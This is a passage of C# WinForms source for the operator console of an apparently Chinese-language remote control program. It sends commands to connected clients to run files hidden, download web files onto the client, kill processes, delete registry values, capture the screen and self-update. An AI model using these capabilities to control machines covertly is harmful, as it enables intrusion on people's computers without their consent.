            this.contextMenuStrip1.Items.Add("刷新", null, 刷新ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("下载文件", null, FileMenuDownload_Click);
            this.contextMenuStrip1.Items.Add("上传文件", null, FileMenuUpload_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("显示运行", null, FileMenuRunShow_Click);
            this.contextMenuStrip1.Items.Add("隐藏运行", null, FileMenuRunHide_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("压缩文件", null, FileMenuCompress_Click);
            this.contextMenuStrip1.Items.Add("解压文件", null, FileMenuDecompress_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("删除", null, FileMenuDelete_Click);
            this.contextMenuStrip1.Items.Add("重命名", null, FileMenuRename_Click);
            this.contextMenuStrip1.Items.Add("新建文件夹", null, FileMenuNewFolder_Click);
            this.contextMenuStrip1.Items.Add("属性", null, FileMenuProperty_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("复制全路径", null, 复制全路径ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("播放音乐", null, 播放音乐ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("停止播放音乐", null, 停止播放音乐ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("远程下载到此处", null, 远程下载到此处ToolStripMenuItem_Click);
        }

        private void 刷新ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshCurrentFileView();
        }

        private void 复制全路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            ListViewItem selectedItem = this.listView1.SelectedItems[0];
            ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;

            try
            {
                Clipboard.SetText(tag.Path);
            }
            catch (Exception)
            {
                MsgBox.Info("复制到剪切板失败！");
            }
        }

        private void 播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个音频文件！");
                return;
            }

            string ext = System.IO.Path.GetExtension(path);
            List<string> exts = new List<string>(){".mp3",".wma",".flac",".ogg"};
            if (!exts.Contains(ext))
            {
                MsgBox.Info("请选择一个音频文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestPlayMusic req = new RequestPlayMusic();
                req.MusicFilePath = path;
                this.currentSession.Send(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
            }
        }

        private void 停止播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.currentSession != null)
            {
                buttonStopPlayMusic_Click(null, null);
            }
        }

        private void 远程下载到此处ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;
            if (this.listView1.Tag == null)
                return;

            var frm = new FrmDownloadWebFile();
            frm.FormClosing += (o, args) =>
            {
                if (frm.WebUrl == null || frm.DestFilePath == null)
                    return;

                RequestDownloadWebFile req = new RequestDownloadWebFile();
                req.WebFileUrl = frm.WebUrl;
                string filePath = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.DestFilePath);
                req.DestinationPath = filePath;
                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
            };
            frm.Show();
        }

        private void 打开文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(this.listView1.SelectedItems.Count<1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = false;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        private void 打开文件隐藏模式ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = true;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        private void FileMenuDownload_Click(object sender, EventArgs e)
        {
            toolStripButton14_Click(sender, e);
        }

        private void FileMenuUpload_Click(object sender, EventArgs e)
        {
            toolStripButton13_Click(sender, e);
        }

        private void FileMenuRunShow_Click(object sender, EventArgs e)
        {
            RunSelectedRemoteFile(eRunFileMode.Show);
        }

        private void FileMenuRunHide_Click(object sender, EventArgs e)
        {
            RunSelectedRemoteFile(eRunFileMode.Hide);
        }

        private void FileMenuCompress_Click(object sender, EventArgs e)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestCompressFile req = new RequestCompressFile();
            req.SourcePath = path;
            req.DestPath = path + ".gz";
            PostRequstWithCurrentSession(ePacketType.PACKET_COMPRESS_FILE_REQUEST, req);
        }

        private void FileMenuDecompress_Click(object sender, EventArgs e)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestDecompressFile req = new RequestDecompressFile();
            req.SourcePath = path;
            req.DestPath = path.EndsWith(".gz", StringComparison.OrdinalIgnoreCase)
                ? path.Substring(0, path.Length - 3)
                : path + ".decomp";
            PostRequstWithCurrentSession(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, req);
        }

        private void FileMenuDelete_Click(object sender, EventArgs e)
        {
            toolStripButton9_Click(sender, e);
        }

        private void FileMenuRename_Click(object sender, EventArgs e)
        {
            toolStripButton2_Click(sender, e);
        }

        private void FileMenuNewFolder_Click(object sender, EventArgs e)
        {
            toolStripButton11_Click(sender, e);
        }

        private void FileMenuProperty_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            ListViewItem item = this.listView1.SelectedItems[0];
            ListViewItemFileOrDirTag tag = item.Tag as ListViewItemFileOrDirTag;
            if (tag == null)
                return;

            string sizeText = item.SubItems.Count > 1 ? item.SubItems[1].Text : string.Empty;
            string timeText = item.SubItems.Count > 2 ? item.SubItems[2].Text : string.Empty;
            string typeText = item.SubItems.Count > 3 ? item.SubItems[3].Text : string.Empty;
            string message = string.Format(
                "名称：{0}\r\n路径：{1}\r\n类型：{2}\r\n大小/磁盘类型：{3}\r\n修改日期/总大小：{4}",
                item.Text,
                tag.Path,
                string.IsNullOrEmpty(typeText) ? (tag.IsFile ? "文件" : "目录/磁盘") : typeText,
                sizeText,
                timeText);
            MsgBox.Info(message);
        }

        private bool TryGetSelectedRemoteFile(out string path)
        {
            path = null;
            if (this.listView1.SelectedItems.Count < 1)
                return false;

            return IsListViewItemAFile(this.listView1.SelectedItems[0], out path);
        }

        private void RunSelectedRemoteFile(eRunFileMode mode)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestRunFile req = new RequestRunFile();
            req.FilePath = path;
            req.Mode = mode;
            PostRequstWithCurrentSession(ePacketType.PACKET_RUN_FILE_REQUEST, req);
        }

        #endregion

        #region 进程管理右键菜单

        private void 刷新ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
        }

        private void 刷新急速ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses(){IsSimpleMode = true});
        }

        private void 结束进程ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView3.SelectedItems.Count < 1)
            {
                MsgBox.Info("请先选择进程！");
                return;
            }
            RequestKillProcesses req = new RequestKillProcesses();
            req.ProcessIds = new List<string>();
            for (int i = 0; i < this.listView3.SelectedItems.Count; i++)
            {
                var item = this.listView3.SelectedItems[i];
                var processId = item.SubItems[1].Text.Trim();
                req.ProcessIds.Add(processId);
            }

            this.PostRequstWithCurrentSession(ePacketType.PACKET_KILL_PROCESS_REQUEST, req);
        } 

        #endregion

        private void toolStripButtonCaptureVideo_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.Info("请先选择客户端！");
                return;
            }
            var frm = new FrmCaptureVideo(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionVideoHandlers.ContainsKey(sessionId))
            {
                this.sessionVideoHandlers.Add(sessionId, frm.HandleScreen);
            }
            else
            {
                this.sessionVideoHandlers[sessionId] = frm.HandleScreen;
            }
            frm.Show();;
        }

        private void toolStripButtonSettings_Click(object sender, EventArgs e)
        {
            var frm = new FrmSettings();
            frm.Owner = this;
            frm.Show();
        }

        private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            Settings.SaveSettings();
        }

        private void 配置服务程序ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            toolStripButtonSettings_Click(null, null);
        }

        private void 关于ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        /// <summary>
        /// 复制按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton7_Click(object sender, EventArgs e)
        { 
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            string path;
            if(!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("不支持文件夹的复制！");
                return;
            }

            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                pi = new PasteInfo();
                toolStripButton8.Tag = pi;
            }
            pi.IsDeleteSourceFile = false;
            pi.SourceFilePath = path;
        }

        /// <summary>
        /// 剪切按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton12_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("不支持文件夹的剪切！");
                return;
            }

            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                pi = new PasteInfo();
                toolStripButton8.Tag = pi;
            }
            pi.IsDeleteSourceFile = true;
            pi.SourceFilePath = path;
        }

        /// <summary>
        /// 粘贴按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                MsgBox.Info("请先复制或移动一个文件！");
                return;
            }

            string pastMode = pi.IsDeleteSourceFile ? "移动" : "复制";
            string curDir = this.listView1.Tag as string;
            if (curDir == null)
            {
                MsgBox.Info("不能" + pastMode + "到当前目录！");
                return;
            }
            if (MsgBox.Question("确定要" + pastMode + "文件" + pi.SourceFilePath + "?", MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;
            string fileName = Path.GetFileName(pi.SourceFilePath);
            string destPath = Path.Combine(curDir, fileName);
            if (pi.IsDeleteSourceFile)
            {
                // move
                RequestMoveFile req = new RequestMoveFile();
                req.SourceFile = pi.SourceFilePath;
                req.DestinationFile = destPath;
                this.currentSession.Send(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, req);
            }
            else
            {
                // copy
                RequestCopyFile req = new RequestCopyFile();
                req.SourceFile = pi.SourceFilePath;
                req.DestinationFile = destPath;
                this.currentSession.Send(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// listivew节点是否为文件
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private bool IsListViewItemAFile(ListViewItem item, out string path)
        {
            ListViewItemFileOrDirTag tag = item.Tag as ListViewItemFileOrDirTag;
            path = tag.Path;
            if (tag.IsFile == false)
            {
                return false;
            }

            return true;
        }

        /// <summary>
        /// listview按键监控
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                toolStripButton9.PerformClick();
            }
            else if (e.KeyCode == Keys.C && e.Control)
            {
                toolStripButton7.PerformClick();
            }
            else if (e.KeyCode == Keys.X && e.Control)
            {
                toolStripButton12.PerformClick();
            }
            else if (e.KeyCode == Keys.V && e.Control)
            {
                toolStripButton8.PerformClick();
            }
            else if (e.KeyCode == Keys.F2)
            {
                toolStripButton2.PerformClick();
            }
        }

        /// <summary>
        /// 重命名按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("不支持文件夹的重命名！");
                return;
            }

            string oldName = System.IO.Path.GetFileName(path);
            var frm = new FrmRename(oldName);
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                RequestRenameFile req = new RequestRenameFile();
                req.SourceFile = path;
                req.DestinationFileName = frm.NewName;
                this.currentSession.Send(ePacketType.PACKET_RENAME_FILE_REQUEST, req);
            }

        }

        /// <summary>
        /// 树控件右键菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button != System.Windows.Forms.MouseButtons.Right)
                return;

            TreeViewHitTestInfo ti = treeView1.HitTest(e.Location);
            if (ti != null && 
                ti.Node != null &&
                ti.Node.Level == 1)
            {
                SocketSession client = ti.Node.Tag as SocketSession;
                if (client != null)
                {
                    this.treeView1.SelectedNode = ti.Node;
                    this.currentSession = client;
                    RSCApplication.oRemoteControlServer.SelectClient(client.SocketId);
                    contextMenuStripClient.Show(this.treeView1, e.Location);
                }
            }
        }

        /// <summary>
        /// “更新客户端”按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonExeCode_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.Info("请先选择客户端！");
                return;
            }
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "请选择客户端程序";
            ofd.Filter = "客户端(*.exe)|*.exe";
            ofd.FilterIndex = 1;
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string codeFile = ofd.FileName;

                new Thread(() => {
                    string codeId = Guid.NewGuid().ToString();
                    System.IO.FileStream fs = new FileStream(codeFile, FileMode.Open, FileAccess.Read);
                    byte[] buffer = new byte[1024];
                    while (true)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;
                        RequestTransportExecCode req = new RequestTransportExecCode();
                        req.Data = new byte[size];
                        for (int i = 0; i < req.Data.Length; i++)
                        {
                            req.ID = codeId;
                            req.Data[i] = buffer[i];
                        }
                        this.currentSession.Send(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, req);
                    }
                    fs.Close();
                    fs.Dispose();
                    this.currentSession.Send(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, new RequestRunExecCode()
                    {
                        ID=codeId, 
                        Mode = eExecMode.ExecByFile,
                        FileArguments = "/delay:5000",
                        IsKillMySelf = true
                    });
                    MsgBox.Info("客户端更新指令已发送！");
                }) { IsBackground = true }.Start();
            }
        }

        private void 退出XToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// 双击注册表项
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (e.Button != System.Windows.Forms.MouseButtons.Left)
                return;

            if (this.currentSession == null)
                return;

            TreeViewHitTestInfo ti = this.treeView2.HitTest(e.Location);
            if (ti != null && ti.Node != null)
            {
                RequestViewRegistryKey req = new RequestViewRegistryKey();
                if (ti.Node.Level == 0)
                {
                    return;
                }
                else if (ti.Node.Level == 1)
                {
                    // 根节点
                    eRegistryHive keyRoot = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), ti.Node.Tag as string);
                    req.KeyRoot = keyRoot;
                    req.KeyPath = null;
                }
                else
                {
                    // 非根节点
                    req = ti.Node.Tag as RequestViewRegistryKey;
                }
                // 在listview上标注当前的key节点
                this.listView2.Tag = req;
                this.textBoxRegistryPath.Text = "计算机\\" + req.KeyRoot + "\\" + req.KeyPath;
                this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, req);
            }
        }

        /// <summary>
        /// 注册表项右键菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView2_MouseUp(object sender, MouseEventArgs e)
        {
            if(e.Button!= System.Windows.Forms.MouseButtons.Right)
                return;

            ContextMenuStrip cms = new System.Windows.Forms.ContextMenuStrip();
            cms.Items.Add("切换", null, (o, args) => {
                if (this.currentSession == null)
                    return;

                TreeViewHitTestInfo ti = this.treeView2.HitTest(e.Location);
                if (ti != null && ti.Node != null)
                {
                    RequestViewRegistryKey req = new RequestViewRegistryKey();
                    if (ti.Node.Level == 0)
                    {
                        return;
                    }
                    else if (ti.Node.Level == 1)
                    {
                        // 根节点
                        eRegistryHive keyRoot = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), ti.Node.Tag as string);
                        req.KeyRoot = keyRoot;
                        req.KeyPath = null;
                    }
                    else
                    {
                        // 非根节点
                        req = ti.Node.Tag as RequestViewRegistryKey;
                    }
                    var frm = new FrmInputUrl();
                    frm.Text = "请输入注册表相对地址";
                    frm.ShowDialog();
                    if (frm.InputText!=null)
                    {
                        if (req.KeyPath == null)
                        {
                            req.KeyPath = frm.InputText;
                        }
                        else
                        {
                            req.KeyPath += "\\" + frm.InputText;
                        }
                        this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, req);
                    }
                }

                
            });
            cms.Show(sender as TreeView, e.Location);

        }

        /// <summary>
        /// 注册表值操作菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView2_MouseUp(object sender, MouseEventArgs e)
        {
            if (this.currentSession == null)
                return;

            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                var key = this.listView2.Tag as RequestViewRegistryKey;
                if (key != null)
                {
                    if (this.listView2.SelectedItems.Count > 0)
                    {
                        string valueName = this.listView2.SelectedItems[0].Text;
                        var req = new RequestOpeRegistryValueName();
                        req.KeyRoot = key.KeyRoot;
                        req.KeyPath = key.KeyPath;
                        req.ValueName = valueName;

                        ContextMenuStrip cms = new ContextMenuStrip();
                        cms.Items.Add("删除", null, (o, args) =>
                        {
                            req.Operation = OpeType.Delete;
                            this.currentSession.Send(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, req);
                        });
                        cms.Show(this.listView2, e.Location);
                    }
                    else
                    {
                        ContextMenuStrip cms = new ContextMenuStrip();
                        cms.Items.Add("刷新", null, (o, args) =>
                        {
                            this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, key);
                        });
                        cms.Show(this.listView2, e.Location);
                    }
                }
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MsgBox.Question("确定要退出远程控制程序?", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                e.Cancel = true;
            }
        }
    }
}
